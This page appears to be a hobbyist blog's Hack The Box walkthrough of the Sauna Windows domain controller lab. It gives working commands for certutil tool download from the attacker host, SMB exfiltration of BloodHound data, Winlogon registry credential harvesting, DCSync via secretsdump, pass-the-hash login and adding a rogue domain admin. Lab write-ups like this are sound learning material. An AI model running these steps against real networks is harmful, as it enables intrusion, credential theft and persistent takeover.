@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Introduction If you’re reading this, hello again! I finished up Hack the Box’s Sauna. This one went a lot quicker than I had anticipated. As I mentioned in my Forest walkthrough, these are meant to be a reference for future me. What I didn’t know was that it was going to come into play so quickly. Let’s jump in.\nEnumeration Again, just like I do for everything, I start with my Nmap scan.\n">
+<title>HTB - Sauna</title>
+
+
+<link rel="canonical" href="http://localhost:1313/walkthroughs/sauna/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.939567bcbd3acb48d79ff58d0271cb631c4a22521655556191d2a0d466ceb5fc.css"><meta property='og:title' content="HTB - Sauna">
+<meta property='og:description' content="Introduction If you’re reading this, hello again! I finished up Hack the Box’s Sauna. This one went a lot quicker than I had anticipated. As I mentioned in my Forest walkthrough, these are meant to be a reference for future me. What I didn’t know was that it was going to come into play so quickly. Let’s jump in.\nEnumeration Again, just like I do for everything, I start with my Nmap scan.\n">
+<meta property='og:url' content='http://localhost:1313/walkthroughs/sauna/'>
+<meta property='og:site_name' content='MidwestSec'>
+<meta property='og:type' content='article'><meta property='article:section' content='Walkthroughs' /><meta property='article:tag' content='Walkthrough' /><meta property='article:tag' content='Hack The Box' /><meta property='article:published_time' content='2026-04-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-04-12T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="HTB - Sauna">
+<meta name="twitter:description" content="Introduction If you’re reading this, hello again! I finished up Hack the Box’s Sauna. This one went a lot quicker than I had anticipated. As I mentioned in my Forest walkthrough, these are meant to be a reference for future me. What I didn’t know was that it was going to come into play so quickly. Let’s jump in.\nEnumeration Again, just like I do for everything, I start with my Nmap scan.\n"><link href="/pagefind/pagefind-ui.css" rel="stylesheet">
+
+<style>
+     
+
+    #mw-reading-progress {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 0%;
+        height: 3px;
+        z-index: 10000;
+        background: var(--accent-color);
+        transition: width 0.1s ease-out;
+    }
+
+     
+
+    #mw-search-button {
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+
+        padding: 10px 14px;
+        margin-bottom: 16px;
+
+        border: 1px solid var(--card-separator-color);
+        border-radius: 8px;
+
+        background: var(--card-background);
+        color: var(--card-text-color-main);
+
+        cursor: pointer;
+        text-align: left;
+
+        transition: background-color 0.2s ease;
+    }
+
+    #mw-search-button:hover {
+        background: var(--card-background-selected);
+    }
+
+    .mw-search-left {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .mw-search-icon {
+        width: 18px;
+        height: 18px;
+        fill: currentColor;
+    }
+
+    .mw-search-shortcut {
+        font-size: 0.8em;
+        opacity: 0.65;
+    }
+
+     
+
+    #mw-search-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+
+        padding: 8vh 16px;
+        overflow-y: auto;
+
+        background: rgba(0, 0, 0, 0.65);
+        backdrop-filter: blur(5px);
+    }
+
+    #mw-search-box {
+        max-width: 850px;
+        margin: auto;
+        padding: 24px;
+
+        background: var(--card-background);
+        color: var(--card-text-color-main);
+
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+    }
+
+    #mw-search-close {
+        margin-bottom: 16px;
+        padding: 8px 14px;
+
+        border: 1px solid var(--card-separator-color);
+        border-radius: 6px;
+
+        background: var(--card-background);
+        color: var(--card-text-color-main);
+
+        cursor: pointer;
+    }
+
+     
+
+    .pagefind-ui {
+        --pagefind-ui-primary: var(--accent-color);
+        --pagefind-ui-background: var(--card-background);
+        --pagefind-ui-text: var(--card-text-color-main);
+        --pagefind-ui-border: var(--card-separator-color);
+        --pagefind-ui-tag: var(--accent-color);
+    }
+
+    .pagefind-ui,
+    .pagefind-ui * {
+        color: var(--card-text-color-main) !important;
+    }
+
+    .pagefind-ui__search-input {
+        background: var(--card-background) !important;
+        color: var(--card-text-color-main) !important;
+        border: 1px solid var(--card-separator-color) !important;
+    }
+
+    .pagefind-ui__drawer {
+        background: var(--card-background) !important;
+    }
+
+    .pagefind-ui__result {
+        padding: 16px 0 !important;
+        background: var(--card-background) !important;
+        border-bottom: 1px solid var(--card-separator-color) !important;
+    }
+
+    .pagefind-ui__result-title a,
+    .pagefind-ui__result-excerpt,
+    .pagefind-ui__message,
+    .pagefind-ui__result-link,
+    .pagefind-ui__button {
+        color: var(--card-text-color-main) !important;
+    }
+
+    .pagefind-ui__result-thumb img {
+        border-radius: 6px;
+    }
+
+    .mw-result-meta {
+        margin-top: 4px;
+        margin-bottom: 8px;
+
+        font-size: 0.85em;
+        opacity: 0.7;
+    }
+
+    mark {
+        padding: 0 2px;
+        background: var(--accent-color);
+        color: var(--accent-color-text);
+    }
+</style>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        <figure class="site-avatar">
+                <a href="/">
+                    <img src="/images/MidwestSec_bw.png" 
+                        width="1254"
+                        height="1254"
+                        class="site-logo"
+                        loading="lazy"
+                        alt="Avatar">
+                </a>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">MidwestSec</a></h1>
+            <h2 class="site-description">Just a Guy Learning</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/whoami/' >
+                
+                <span>whoami</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/blog/' >
+                
+                <span>Blog</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/walkthroughs/' >
+                
+                <span>Walkthroughs</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tags/' >
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://newsletter.midwestsec.com' >
+                
+                <span>Newsletter</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#http--as-rep-roast">HTTP + AS-REP Roast</a></li>
+    <li><a href="#evil-winrm--sharphound">Evil-WinRM + SharpHound</a></li>
+    <li><a href="#bloodhound">BloodHound</a></li>
+    <li><a href="#stored-passwords--privilege-escalation">Stored Passwords + Privilege Escalation</a></li>
+    <li><a href="#compromise--persistence">Compromise + Persistence</a></li>
+    <li><a href="#final-thoughts">Final Thoughts</a></li>
+  </ul>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/walkthroughs/sauna/">HTB - Sauna</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2026-04-12T00:00:00Z'>Sunday, April 12, 2026</time>
+                
+
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                    <time class="article-time--reading">
+                        7 minutes read
+                    </time>
+                
+            </div>
+        
+
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>Table of contents</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#http--as-rep-roast">HTTP + AS-REP Roast</a></li>
+    <li><a href="#evil-winrm--sharphound">Evil-WinRM + SharpHound</a></li>
+    <li><a href="#bloodhound">BloodHound</a></li>
+    <li><a href="#stored-passwords--privilege-escalation">Stored Passwords + Privilege Escalation</a></li>
+    <li><a href="#compromise--persistence">Compromise + Persistence</a></li>
+    <li><a href="#final-thoughts">Final Thoughts</a></li>
+  </ul>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction"><a href="#introduction" class="header-anchor"></a>Introduction
+</h2><p>If you’re reading this, hello again! I finished up Hack the Box’s
+<em>Sauna</em>. This one went a lot quicker than I had anticipated. As I mentioned in my Forest walkthrough, these are meant to be a reference for future me. What I didn’t know was that it was going to come into play so quickly. Let’s jump in.</p>
+<h2 id="enumeration"><a href="#enumeration" class="header-anchor"></a>Enumeration
+</h2><p>Again, just like I do for everything, I start with my Nmap scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-07 07:52 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.180
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.030s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65515</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Egotistical Bank :: Home
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-04-07 19:54:10Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49678/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49679/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49692/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49700/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2019|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> - 21H1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: 6h59m51s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-04-07T19:55:03
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span></code></pre></div><p>Analyzing the scan, I notice quite a few similarities to the Forest box. It is a domain controller, has HTTP, LDAP and WinRM open. At this point, I’m thinking that this could be a very similar setup to Forest.</p>
+<h2 id="http--as-rep-roast"><a href="#http--as-rep-roast" class="header-anchor"></a>HTTP + AS-REP Roast
+</h2><p>Let’s start with HTTP. I opened my browser and navigated to the webpage. Right off the bat, I am presented with Egotistical Bank’s homepage. Knowing that this is an actual webpage, I start DirBuster to enumerate available paths. DirBuster is a great tool to use when it comes to HTTP. It will take a wordlist and run through the URL and see if any pages exist. If it comes back with an HTTP 200, 301 or 403, it will report. HTTP 200 means that the page exists and is accessible. HTTP 301 is a redirect. This means that it will redirect you to a different page. 403 is an indication that you don’t have permission to view that page.</p>
+<p>The way I approach DirBuster is to launch it with the &amp; at the end of the command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirbuster&amp;
+</span></span></code></pre></div><p>The &amp; allows it to open from the terminal but still allow other commands to run. I start with the DirBuster medium list and let it run. I select the “go faster” option. Since I know this is IIS, I select asp and aspx for file extensions. If this were Linux, I would leave it as PHP.</p>
+<p><img alt="Dirbuster Window" class="gallery-image" data-flex-basis="337px" data-flex-grow="140" height="1078" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/dirbuster.png" srcset="/walkthroughs/sauna/dirbuster_hu_92e0fd8d4025db99.png 800w, /walkthroughs/sauna/dirbuster.png 1514w" width="1514"></p>
+<p>While DirBuster is running, I’m analyzing the web site itself. I look at blogs and see a “jenny joy” that has posted. I make note of that as a potential user. I then see the “About” page. Looking through that, I see a list of employees. I created a txt file with different combinations their names. For example, first initial+last name, first name+last name, etc… After creating a list of potential usernames, I attempted AS-REP roasting. I followed the same path as I did in Forest, so I won’t go into that detail. After going through the AS-REP roasting, I was successful and obtained an AS-REP hash for fsmith. From there, I was able to crack the password using Hashcat. Again, it was the same process as Forest.</p>
+<p><img alt="AS-REP Roast" class="gallery-image" data-flex-basis="892px" data-flex-grow="371" height="452" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/asreproast.png" srcset="/walkthroughs/sauna/asreproast_hu_9d0a8b720547b44d.png 800w, /walkthroughs/sauna/asreproast_hu_e1e09534567f0496.png 1600w, /walkthroughs/sauna/asreproast.png 1680w" width="1680">
+<img alt="Cracked AS-REP Roast Hash" class="gallery-image" data-flex-basis="1731px" data-flex-grow="721" height="232" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/crackeduserpw.png" srcset="/walkthroughs/sauna/crackeduserpw_hu_63c905043890edf5.png 800w, /walkthroughs/sauna/crackeduserpw_hu_2d520a3f74d4b572.png 1600w, /walkthroughs/sauna/crackeduserpw.png 1674w" width="1674"></p>
+<h2 id="evil-winrm--sharphound"><a href="#evil-winrm--sharphound" class="header-anchor"></a>Evil-WinRM + SharpHound
+</h2><p>With valid credentials, I established a foothold using Evil-WinRM. While navigating through the machine, an account stood out: svc-loanmanager. I decided to focus on that later.</p>
+<p>I copied SharpHound over to the remote machine. I first navigated to where SharpHound is located and then started up a simple HTTP server. This allows me to copy the file from Kali to the remote machine. The IP of 10.10.15.101 is the IP of my machine.</p>
+<p>On Kali</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /usr/share/sharphound
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>On the DC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certutil -urlcache -f http://10.10.15.101/SharpHound sharp.exe
+</span></span></code></pre></div><p>This uses the built-in Windows command to download the file from my Kali machine. Once it has been downloaded, I simply run SharpHound. SharpHound gathers Active Directory data for analysis in BloodHound.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.<span style="color:#ae81ff">\s</span>harp.exe
+</span></span></code></pre></div><p>Once I have the data, I copy it back to my machine for analysis in BloodHound. The easiest way I’ve found to copy from the remote machine to my attacking machine is to host an SMB server on my machine and copy that way. I prefer using SMB because it is typically faster and more reliable than HTTP for transferring files.</p>
+<p>On Kali</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-smbserver share . -smb2support
+</span></span></code></pre></div><p>On the DC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>copy 20260410162326_BloodHound.zip <span style="color:#ae81ff">\\</span>10.10.15.101<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\
+</span></span></span></code></pre></div><p>Now that I have the data, I imported the data into BloodHound.</p>
+<h2 id="bloodhound"><a href="#bloodhound" class="header-anchor"></a>BloodHound
+</h2><p>Again, I’m slowly learning the nuances of BloodHound. I analyzed the data I had for the fsmith account. It showed PSRemote as a potential escalation path. After looking into it, it wasn’t going to provide me any access that I didn’t already have by Evil-WinRM. As I mentioned earlier, I noticed that svc-loanmanager account. I investigated that account and noticed it had DCSync permissions already. This was the lightbulb moment. If I could compromise that account, I could perform a DCSync. DCSync allows for data replication from the domain controller, if the user has permissions to do so. When it syncs, it relays users and password hashes. I now have my next target.</p>
+<p><img alt="BloodHound Links" class="gallery-image" data-flex-basis="1423px" data-flex-grow="593" height="442" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/bh_dcsync.png" srcset="/walkthroughs/sauna/bh_dcsync_hu_17b6991d4e62f1bc.png 800w, /walkthroughs/sauna/bh_dcsync_hu_ca953810e79b05a9.png 1600w, /walkthroughs/sauna/bh_dcsync_hu_dc13f72c7f541b61.png 2400w, /walkthroughs/sauna/bh_dcsync.png 2622w" width="2622"></p>
+<h2 id="stored-passwords--privilege-escalation"><a href="#stored-passwords--privilege-escalation" class="header-anchor"></a>Stored Passwords + Privilege Escalation
+</h2><p>I went through my Windows Privilege Escalation notes to see what paths I might have available to me. I looked at user permissions and didn’t have anything that I could readily abuse. Continuing through my notes, I started to look for passwords. Initially, I used a simple findstr command to see if I could get anything to return.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>findstr /si password *.txt
+</span></span></code></pre></div><p>While that was running, I continued through my notes. I came across a registry query command that looks in the WinLogon section for credentials. The WinLogon registry key controls elements of the Windows logon process. If auto-logon is configured for a user, the credentials could be stored in plaintext. This can then be retrieved and used. I used the following command on the DC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>reg query <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span>
+</span></span></code></pre></div><p>This brought back the password for the svc-loanmanager account that I was focused on. Now that I had those credentials, I could perform a DCSync attack and gather the hashes for all users within the domain.</p>
+<p><img alt="Service account password" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="svc%20account.png"></p>
+<h2 id="compromise--persistence"><a href="#compromise--persistence" class="header-anchor"></a>Compromise + Persistence
+</h2><p>I performed the DCSync and gathered the hashes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump egotisticalbank/svc_loanmgr:<span style="color:#e6db74">&#39;[PW]&#39;</span>@10.129.10.103
+</span></span></code></pre></div><p><img alt="Successful DCSync" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="admin%20hash.png"></p>
+<p>Now that I have the administrator hash, I used Evil-WinRM to get back into the DC as the domain admin.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.129.10.103 -u Administrator -H <span style="color:#f92672">[</span>hash<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><img alt="Domain Admin WinRM" class="gallery-image" data-flex-basis="779px" data-flex-grow="324" height="512" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/admin.png" srcset="/walkthroughs/sauna/admin_hu_de2e83d124c23510.png 800w, /walkthroughs/sauna/admin_hu_f3a3874bdd984978.png 1600w, /walkthroughs/sauna/admin.png 1662w" width="1662"></p>
+<p>I then navigated to the desktop and captured the flag. To demonstrate full domain compromise and persistence, I created a new domain administrator account. On the DC, I ran:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net user zach abcd.1234! /add
+</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;Domain Admins&#34;</span> zach /add
+</span></span></code></pre></div><p>This created an account named zach that is a domain admin. Again, I used Evil-WinRM to gain access to the DC and prove that I was a domain admin.</p>
+<p><img alt="New Admin Proof" class="gallery-image" data-flex-basis="1894px" data-flex-grow="789" height="170" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/add_da.png" srcset="/walkthroughs/sauna/add_da_hu_4de68496a40db8d.png 800w, /walkthroughs/sauna/add_da.png 1342w" width="1342"></p>
